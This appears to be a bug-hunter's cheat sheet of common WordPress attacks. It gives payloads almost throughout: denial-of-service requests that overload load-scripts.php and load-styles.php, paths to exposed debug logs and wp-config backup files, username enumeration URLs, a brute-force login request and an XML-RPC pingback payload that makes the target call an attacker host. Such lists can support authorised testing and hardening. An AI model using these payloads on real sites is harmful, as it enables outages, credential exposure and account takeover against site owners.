# WordPress Common Bugs

1. Denial of Service via load-scripts.php
```
http://target.com/wp-admin/load-scripts.php?load=react,react-dom,moment,lodash,wp-polyfill-fetch,wp-polyfill-formdata,wp-polyfill-node-contains,wp-polyfill-url,wp-polyfill-dom-rect,wp-polyfill-element-closest,wp-polyfill,wp-block-library,wp-edit-post,wp-i18n,wp-hooks,wp-api-fetch,wp-data,wp-date,editor,colorpicker,media,wplink,link,utils,common,wp-sanitize,sack,quicktags,clipboard,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-reply,json2,underscore,backbone,wp-util,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrate,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,esprima,jshint,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-bar,wplink,wpdialogs,word-count,media-upload,hoverIntent,hoverintent-js,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embed,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,site-health,privacy-tools,updates,farbtastic,iris,wp-color-picker,dashboard,list-revisions,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
```

2. Denial of Service via load-styles.php
```
http://target.com/wp-admin/load-styles.php?&load=common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,widgets,site-icon,l10n,install,wp-color-picker,customize-controls,customize-widgets,customize-nav-menus,customize-preview,ie,login,site-health,buttons,admin-bar,wp-auth-check,editor-buttons,media-views,wp-pointer,wp-jquery-ui-dialog,wp-block-library-theme,wp-edit-blocks,wp-block-editor,wp-block-library,wp-components,wp-edit-post,wp-editor,wp-format-library,wp-list-reusable-blocks,wp-nux,deprecated-media,farbtastic
```

3. Log files exposed
```
http://target.com/wp-content/debug.log
```

4. Backup file wp-config exposed
```
.wp-config.php.swp
wp-config.inc
wp-config.old
wp-config.txt
wp-config.html
wp-config.php.bak
wp-config.php.dist
wp-config.php.inc
wp-config.php.old
wp-config.php.save
wp-config.php.swp
wp-config.php.txt
wp-config.php.zip
wp-config.php.html
wp-config.php~
```

5. Information disclosure wordpress username
```
http://target.com/?author=1
```
```
http://target.com/wp-json/wp/v2/users
http://target.com/?rest_route=/wp/v2/users
```

6. Bruteforce in wp-login.php
```
POST /wp-login.php HTTP/1.1
Host: target.com

log=admin&pwd=BRUTEFORCE_IN_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%2F&testcookie=1
```

7. XSPA in wordpress
```
POST /xmlrpc.php HTTP/1.1
Host: target.com

<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://yourip:port</string></value>
</param><param>
<value>
<string>https://target.com></string>
</value>
</param></params>
</methodCall>
```
